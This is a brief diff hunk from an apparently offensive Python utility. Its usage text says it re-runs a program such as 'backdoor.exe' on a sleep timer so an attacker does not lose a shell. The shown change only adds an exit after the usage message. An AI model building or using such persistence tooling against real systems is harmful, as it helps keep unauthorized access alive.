@@ -14,6 +14,7 @@ def get_arguments():
               "with a specified sleep timer, so you won't lose your shell anymore.")
         print("Usage: " + sys.argv[0] + " 30 " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
         print("Usage: " + sys.argv[0] + " " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
+        sys.exit()
     sleep_timer = sys.argv[1]
     try:
         sleep_timer = int(sleep_timer)
